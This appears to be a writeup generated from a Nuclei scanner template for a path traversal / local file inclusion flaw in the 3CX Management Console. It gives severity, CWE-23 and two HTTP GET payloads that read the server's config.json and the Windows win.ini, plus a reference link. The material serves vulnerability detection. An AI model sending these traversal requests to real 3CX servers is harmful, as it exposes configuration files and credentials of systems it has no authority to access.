# Nuclei Template: 3CX Management Console - Local File Inclusion
**Template ID:** 3cx-management-console
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`3cx-management-console.yaml`)

## Vulnerability Information & PoC

## Description
3CX Management Console is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json
GET {{BaseURL}}/Electron/download/windows/\windows\win.ini
```

## References
- https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88
